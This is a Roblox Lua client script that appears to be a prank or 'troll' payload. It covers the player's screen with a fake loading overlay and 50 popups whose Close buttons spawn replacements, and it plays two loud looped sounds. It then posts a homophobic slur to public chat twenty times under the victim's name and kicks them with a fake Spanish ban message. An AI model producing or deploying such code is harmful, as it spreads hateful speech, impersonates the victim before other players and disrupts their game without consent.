local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService

local function SendMessage(message)
    message = tostring(message)

    if not isLegacyChat then
        local generalChannel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if generalChannel then
            generalChannel:SendAsync(message)
        else
            warn("RBXGeneral channel not found.")
        end
    else
        local sayMessage = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
        if sayMessage then
            sayMessage:FindFirstChild("SayMessageRequest"):FireServer(message, "All")
        else
            warn("SayMessageRequest not found.")
        end
    end
end




local Player = game.Players.LocalPlayer
local PlayerGui = Player.PlayerGui

local Seed = math.random(000000,999999)
local ImageIds = {14234565419, 16889638680, 17136985895, 2594909877, 6620001661, 13886507959, 17336141677, 13884220387}
local Size = {
	FrameSize = UDim2.fromScale(0.075,0.1);
	TextButtonSize = UDim2.fromScale(0.415,0.215);
	TextButtonPosition = UDim2.fromScale(0.585);
};
local RandText = {
	"BAN", "RE BAN", "ZZZZ", "ZZZZZZZZZ", "GG"
};
local Positions = {0,.5,.1,.15,.2,.25,.3,.35,.4,.45,.5,.55,.6,.65,.7,.75,.8,.85,.9,.95,1}

function CreateFrame(Gui)
	local Frame = Instance.new("Frame", Gui)
	Frame.Size = Size.FrameSize
	Frame.BackgroundColor3 = Color3.fromRGB(134,134,134)
	Frame.Position = UDim2.fromScale(Positions[math.random(1,#Positions)],Positions[math.random(1,#Positions)])
	local Image = Instance.new("ImageLabel", Frame)
	Image.Size = UDim2.fromScale(1,1)
	Image.Image = "rbxassetid://"..ImageIds[math.random(1,#ImageIds)]
	local Button = Instance.new("TextButton", Frame)
	Button.ZIndex = 2
	Button.TextScaled = true
	Button.Text = "Close"
	Button.Size = Size.TextButtonSize
	Button.Position = Size.TextButtonPosition
	Button.BackgroundColor3 = Color3.fromRGB(255,0,0)
	
	Button.Activated:Connect(function()
		CreateFrame(Gui)
		Frame:Destroy()
	end)
end

function CreateText(Gui)
	local Text = Instance.new("TextLabel", Gui)
	Text.Size = Size.FrameSize
	Text.BackgroundTransparency = 1
	Text.TextScaled = true
	Text.Position = UDim2.fromScale(Positions[math.random(1,#Positions)],Positions[math.random(1,#Positions)])
	
	Text.Text = RandText[math.random(1,#RandText)]
end

local Gui = Instance.new("ScreenGui", PlayerGui)
Gui.Name = Seed
Gui.IgnoreGuiInset = true
Gui.ResetOnSpawn = false

local TextLabel = Instance.new("TextLabel", Gui)
TextLabel.Size = UDim2.fromScale(1,1)
TextLabel.Text = "LOADING."
TextLabel.TextScaled = true
TextLabel.BackgroundTransparency = .5
TextLabel.BackgroundColor3 = Color3.fromRGB(134,134,134)

task.wait(5)

local MangoSound = Instance.new("Sound", game.SoundService)
MangoSound.SoundId = "rbxassetid://114314350676752"
MangoSound.Volume = 5
MangoSound.Looped = true
MangoSound:Play()
local PhonkSound = Instance.new("Sound", game.SoundService)
PhonkSound.SoundId = "rbxassetid://14145620056"
PhonkSound.Volume = 5
PhonkSound.Looped = true
PhonkSound:Play()


for Index=1,50 do
	CreateText(Gui)
	CreateFrame(Gui)
	
	task.wait()
end

for i = 1, 20 do
    SendMessage("Fuck you Gays")
    task.wait(2)
end

Player:Kick("OYE QUE HACES AQUI ESTAS BANEADO")
